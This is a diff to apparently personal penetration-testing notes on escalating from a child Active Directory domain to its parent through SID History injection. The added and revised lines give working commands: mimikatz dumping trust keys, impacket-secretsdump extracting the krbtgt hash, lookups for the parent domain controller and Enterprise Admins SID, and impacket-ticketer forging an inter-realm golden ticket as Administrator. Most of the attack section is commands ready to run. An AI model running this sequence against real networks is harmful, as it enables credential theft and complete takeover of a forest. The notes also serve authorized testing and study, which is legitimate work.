@@ -35,6 +35,9 @@ Get-DomainUser -Domain <child_domain> | select SamAccountName
 ```
 
 ## Attacking Domain Trusts -- Child -> Parent
+This it if TrustDirection = 3 (bidirectional) and trustAttributes: 32
+
+
 If we PWN a Child Domain, we may be able to escalate to the Parent Domain via SID History Injection.
 
 During a domain migration, a user's original security identifier (SID) is added to the new account's [SID-History](https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) attribute, which ensures they retain access to old resources. Attackers can exploit this by injecting an administrator's SID into the sidHistory of a less-privileged account they control. This grants the account administrative privileges upon LOGIN, enabling actions like DCSync and Golden Ticket attacks for full domain control.
@@ -48,6 +51,10 @@ Requirements:
 	Root Domain
 		SID of Enterprise Admins group
 
+Note - We can use mimikatz to dump trust keys
+```powershell
+mimikatz.exe "privilege::debug" "lsadump::trust /patch" "exit"
+```
 #### ExtraSids Attack (Golden Ticket) -- Windows
 ```powershell
 # Collecting Our Requirements
@@ -81,13 +88,22 @@ From here you can then do whatever you want to the parent domain...
 
 #### ExtraSids Attack (Golden Ticket) -- Linux
 ```Bash
-# Collect Requirements
+## Collect Requirements
 impacket-secretsdump <child_domain>/<user>@<ip> -just-dc-user <DOMAIN>/krbtgt 
 impacket-lookupsid <child_domain>/<user>@<ip> | grep "Domain SID"
-impacket-lookupsid <child_domain>/<user>@<DC_ip> | grep -B12 "Enterprise Admins"
 
-# Create Golden Ticket
-impacket-ticketer -nthash <krbtgt hash> -domain <child FQDN> -domain-sid <child SID> -extra-sid <Enterprise Admins SID> hacker
+# Identify parent dc
+nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain> <child_dc_ip>
+	# Be sure to add tunnel after
+
+# Identify parent sid
+# NOTE: Bloodhound might already have this... MATCH (m:Domain) return m
+impacket-lookupsid <child_domain>/<user>@<parent_DC_ip> | grep "Domain SID"
+	# Add -519 to the end for EA SID
+
+# Create Golden Ticket (Forged Inter-Realm ticket)
+impacket-ticketer -nthash <krbtgt hash> -domain <child FQDN> -domain-sid <child SID> -extra-sid <parent_domain_sid-519> -spn 'krbtgt/<parent_domain>' Administrator
+	# Forged user can be anyone we want
 
 # Set KRB5CCNAME env variable
 export KRB5CCNAME=hacker.ccache
